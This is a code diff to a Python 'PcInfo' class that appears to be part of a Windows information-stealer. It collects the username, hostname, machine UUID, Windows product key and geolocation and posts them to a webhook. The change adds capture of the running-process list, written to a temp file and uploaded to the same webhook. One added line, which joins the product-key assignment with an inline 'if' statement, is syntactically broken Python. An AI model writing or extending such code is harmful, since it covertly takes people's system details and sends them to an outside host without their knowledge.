@@ -33,8 +33,15 @@ class PcInfo:
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
+        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip(); if product_key == "": product_key = "Failed to get product key"
 
+        # Gets list of processes currently running in the system
+        tasklist_file = os.path.join(temp, "TaskList.txt")
+        process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
+        output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+        if output:
+            with open(tasklist_file, "w", errors= "ignore") as f:
+                f.write(output)
 
         try:
             r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
@@ -88,3 +95,5 @@ class PcInfo:
         }
 
         requests.post(webhook, json=data)
+        if os.path.isfile(tasklist_file):
+            requests.post(webhook, files={"file": open(tasklist_file, "rb")})
